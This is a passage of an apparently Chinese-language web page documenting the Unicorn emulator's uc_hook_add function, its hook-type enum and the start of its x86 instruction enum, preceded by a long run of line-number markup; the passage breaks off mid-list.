class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uc_err <span class="hljs-title">uc_hook_add</span><span class="hljs-params">(uc_engine *uc, uc_hook *hh, <span class="hljs-keyword">int</span> type, <span class="hljs-keyword">void</span> *callback,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">void</span> *user_data, <span class="hljs-keyword">uint64_t</span> begin, <span class="hljs-keyword">uint64_t</span> end, ...)</span></span>;<br><br>注册hook事件的回调，当hook事件被触发将会进行回调。<br> @uc: uc_open() 返回的句柄<br> @hh: 注册hook得到的句柄. uc_hook_del() 中使用<br> @type: hook 类型<br> @callback: 当指令被命中时要运行的回调<br> @user_data: 用户自定义数据. 将被传递给回调函数的最后一个参数 @user_data<br> @begin: 回调生效区域的起始地址(包括)<br> @end: 回调生效区域的结束地址(包括)<br>   注意 <span class="hljs-number">1</span>: 只有回调的地址在[@begin, @end]中才会调用回调<br>   注意 <span class="hljs-number">2</span>: 如果 @begin &gt; @end, 每当触发此hook类型时都会调用回调<br> @...: 变量参数 (取决于 @type)<br>   注意: 如果 @type = UC_HOOK_INSN, 这里是指令ID (如: UC_X86_INS_OUT)<br><br> @<span class="hljs-keyword">return</span> 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型<br><br>uc_hook_type<br>uc_hook_add()的所有hook类型参数<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> uc_hook_type &#123;<br>    <span class="hljs-comment">// Hook 所有中断/syscall 事件</span><br>    UC_HOOK_INTR = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<br>    <span class="hljs-comment">// Hook 一条特定的指令 - 只支持非常小的指令子集</span><br>    UC_HOOK_INSN = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,<br>    <span class="hljs-comment">// Hook 一段代码</span><br>    UC_HOOK_CODE = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,<br>    <span class="hljs-comment">// Hook 基本块</span><br>    UC_HOOK_BLOCK = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,<br>    <span class="hljs-comment">// 用于在未映射的内存上读取内存的Hook</span><br>    UC_HOOK_MEM_READ_UNMAPPED = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,<br>    <span class="hljs-comment">// Hook 无效的内存写事件</span><br>    UC_HOOK_MEM_WRITE_UNMAPPED = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>,<br>    <span class="hljs-comment">// Hook 执行事件的无效内存</span><br>    UC_HOOK_MEM_FETCH_UNMAPPED = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>,<br>    <span class="hljs-comment">// Hook 读保护的内存</span><br>    UC_HOOK_MEM_READ_PROT = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>,<br>    <span class="hljs-comment">// Hook 写保护的内存</span><br>    UC_HOOK_MEM_WRITE_PROT = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>,<br>    <span class="hljs-comment">// Hook 不可执行内存上的内存</span><br>    UC_HOOK_MEM_FETCH_PROT = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">9</span>,<br>    <span class="hljs-comment">// Hook 内存读取事件</span><br>    UC_HOOK_MEM_READ = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">10</span>,<br>    <span class="hljs-comment">// Hook 内存写入事件</span><br>    UC_HOOK_MEM_WRITE = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">11</span>,<br>    <span class="hljs-comment">// Hook 内存获取执行事件</span><br>    UC_HOOK_MEM_FETCH = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>,<br>    <span class="hljs-comment">// Hook 内存读取事件，只允许能成功访问的地址</span><br>    <span class="hljs-comment">// 成功读取后将触发回调</span><br>    UC_HOOK_MEM_READ_AFTER = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">13</span>,<br>    <span class="hljs-comment">// Hook 无效指令异常</span><br>    UC_HOOK_INSN_INVALID = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">14</span>,<br>&#125; uc_hook_type;<br><br><span class="hljs-comment">//&gt; X86 instructions</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">uc_x86_insn</span> &#123;</span><br><span class="hljs-number">0</span>    UC_X86_INS_INVALID = <span class="hljs-number">0</span>,<br><span class="hljs-number">1</span>    UC_X86_INS_AAA,<br><span class="hljs-number">2</span>    UC_X86_INS_AAD,<br><span class="hljs-number">3</span>    UC_X86_INS_AAM,<br><span class="hljs-number">4</span>    UC_X86_INS_AAS,<br><span class="hljs-number">5</span>    UC_X86_INS_FABS,<br><span class="hljs-number">6</span>    UC_X86_INS_ADC,<br><span class="hljs-number">7</span>    UC_X86_INS_ADCX,<br><span class="hljs-number">8</span>    UC_X86_INS_ADD,<br><span class="hljs-number">9</span>    UC_X86_INS_ADDPD,<br><span class="hljs-number">10</span>    UC_X86_INS_ADDPS,<br><span class="hljs-number">11</span>    UC_X86_INS_ADDSD,<br><span class="hljs-number">12</span>    UC_X86_INS_ADDSS,<br><span class="hljs-number">13</span>    UC_X86_INS_ADDSUBPD,<br><span class="hljs-number">14</span>    UC_X86_INS_ADDSUBPS,<br><span class="hljs-number">15</span>    UC_X86_INS_FADD,<br><span class="hljs-number">16</span>    UC_X86_INS_FIADD,<br><span class="hljs-number">17</span>    UC_X86_INS_FADDP,<br><span class="hljs-number">18</span>    UC_X86_INS_ADOX,<br><span class="hljs-number">19</span>    UC_X86_INS_AESDECLAST,<br><span class="hljs-number">20</span>    UC_X86_INS_AESDEC,<br><span class="hljs-number">21</span>    UC_X86_INS_AESENCLAST,<br><span class="hljs-number">22</span>    UC_X86_INS_AESENC,<br><span class="hljs-number">23</span>    UC_X86_INS_AESIMC,<br><span class="hljs-number">24</span>    UC_X86_INS_AESKEYGENASSIST,<br><span class="hljs-number">25</span>    UC_X86_INS_AND,<br><span class="hljs-number">26</span>    UC_X86_INS_ANDN,<br><span class="hljs-number">27</span>    UC_X86_INS_ANDNPD,<br><span class="hljs-number">28</span>    UC_X86_INS_ANDNPS,<br><span class="hljs-number">29</span>    UC_X86_INS_ANDPD,<br><span class="hljs-number">30</span>    UC_X86_INS_ANDPS,<br><span class="hljs-number">31</span>    UC_X86_INS_ARPL,<br><span class="hljs-number">32</span>    UC_X86_INS_BEXTR,<br><span class="hljs-number">33</span>    UC_X86_INS_BLCFILL,<br><span class="hljs-number">34</span>    UC_X86_INS_BLCI,<br><span class="hljs-number">35</span>    UC_X86_INS_BLCIC,<br><span class="hljs-number">36</span>    UC_X86_INS_BLCMSK,<br><span class="hljs-number">37</span>    UC_X86_INS_BLCS,<br><span class="hljs-number">38</span>    UC_X86_INS_BLENDPD,<br><span class="hljs-number">39</span>    UC_X86_INS_BLENDPS,<br><span class="hljs-number">40</span>    UC_X86_INS_BLENDVPD,<br><span class="hljs-number">41</span>    UC_X86_INS_BLENDVPS,<br><span class="hljs-number">42</span>    UC_X86_INS_BLSFILL,<br><span class="hljs-number">43</span>    UC_X86_INS_BLSI,<br><span class="hljs-number">44</span>    UC_X86_INS_BLSIC,<br><span class="hljs-number">45</span>    UC_X86_INS_BLSMSK,<br><span class="hljs-number">46</span>    UC_X86_INS_BLSR,<br><span class="hljs-number">47</span>    UC_X86_INS_BOUND,<br><span class="hljs-number">48</span>    UC_X86_INS_BSF,<br><span class="hljs-number">49</span>    UC_X86_INS_BSR,<br><span class="hljs-number">50</span>    UC_X86_INS_BSWAP,<br><span class="hljs-number">51</span>    UC_X86_INS_BT,<br><span class="hljs-number">52</span>    UC_X86_INS_BTC,<br><span class="hljs-number">53</span>    UC_X86_INS_BTR,<br><span class="hljs-number">54</span>    UC_X86_INS_BTS,<br><span class="hljs-number">55</span>    UC_X86_INS_BZHI,<br><span class="hljs-number">56</span>    UC_X86_INS_CALL,<br><span class="hljs-number">57</span>    UC_X86_INS_CBW,<br><span class="hljs-number">58</span>    UC_X86_INS_CDQ,<br><span class="hljs-number">59</span>    UC_X86_INS_CDQE,<br><span class="hljs-number">60</span>    UC_X86_INS_FCHS,<br><span class="hljs-number">61</span>    UC_X86_INS_CLAC,<br><span class="hljs-number">62</span>    UC_X86_INS_CLC,<br><span class="hljs-number">63</span>    UC_X86_INS_CLD,<br><span class="hljs-number">64</span>    UC_X86_INS_CLFLUSH,<br><span class="hljs-number">65</span>    UC_X86_INS_CLFLUSHOPT,<br><span class="hljs-number">66</span>    UC_X86_INS_CLGI,<br><span class="hljs-number">67</span>    UC_X86_INS_CLI,<br><span class="hljs-number">68</span>    UC_X86_INS_CLTS,<br><span class="hljs-number">69</span>    UC_X86_INS_CLWB,<br><span class="hljs-number">70</span>    UC_X86_INS_CMC,<br><span class="hljs-number">71</span>    UC_X86_INS_CMOVA,<br><span class="hljs-number">72</span>    UC_X86_INS_CMOVAE,<br><span class="hljs-number">73</span>    UC_X86_INS_CMOVB,<br><span class="hljs-number">74</span>    UC_X86_INS_CMOVBE,<br><span class="hljs-number">75</span>    UC_X86_INS_FCMOVBE,<br><span class="hljs-number">76</span>    UC_X86_INS_FCMOVB,<br><span class="hljs-number">77</span>    UC_X86_INS_CMOVE,<br><span class="hljs-number">78</span>    UC_X86_INS_FCMOVE,<br><span class="hljs-number">79</span>    UC_X86_INS_CMOVG,<br><span class="hljs-number">80</span>    UC_X86_INS_CMOVGE,<br><span class="hljs-number">81</span>    UC_X86_INS_CMOVL,<br><span class="hljs-number">82</span>    UC_X86_INS_CMOVLE,<br><span class="hljs-number">83</span>    UC_X86_INS_FCMOVNBE,<br><span class="hljs-number">84</span>    UC_X86_INS_FCMOVNB,<br><span class="hljs-number">85</span>    UC_X86_INS_CMOVNE,<br><span class="hljs-number">86</span>    UC_X86_INS_FCMOVNE,<br><span class="hljs-number">87</span>    UC_X86_INS_CMOVNO,<br><span class="hljs-number">88</span>    UC_X86_INS_CMOVNP,<br><span class="hljs-number">89</span>    UC_X86_INS_FCMOVNU,<br><span class="hljs-number">90</span>    UC_X86_INS_CMOVNS,<br><span class="hljs-number">91</span>    UC_X86_INS_CMOVO,<br><span class="hljs-number">92</span>    UC_X86_INS_CMOVP,<br><span class="hljs-number">93</span>    UC_X86_INS_FCMOVU,<br><span class="hljs-number">94</span>    UC_X86_INS_CMOVS,<br><span class="hljs-number">95</span>    UC_X86_INS_CMP,<br><span class="hljs-number">96</span>    UC_X86_INS_CMPPD,<br><span class="hljs-number">97</span>    UC_X86_INS_CMPPS,<br><span class="hljs-number">98</span>    UC_X86_INS_CMPSB,<br><span class="hljs-number">99</span>    UC_X86_INS_CMPSD,<br><span class="hljs-number">100</span>    UC_X86_INS_CMPSQ,<br><span class="hljs-number">101</span>    